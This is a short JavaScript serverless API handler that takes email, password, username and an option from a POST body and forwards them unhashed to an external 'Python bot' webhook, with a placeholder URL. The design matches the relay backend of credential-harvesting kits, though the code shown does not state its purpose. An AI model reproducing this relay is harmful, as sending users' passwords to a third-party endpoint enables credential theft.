export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { email, password, username, option } = req.body;

    // ===== YOUR PYTHON BOT WEBHOOK URL =====
    const WEBHOOK_URL = "https://your-python-bot-url.com/webhook";

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password, username, option })
        });

        const result = await response.json();
        return res.status(200).json(result);

    } catch (error) {
        console.error('Error:', error);
        return res.status(200).json({ 
            success: false, 
            error: error.message 
        });
    }
}
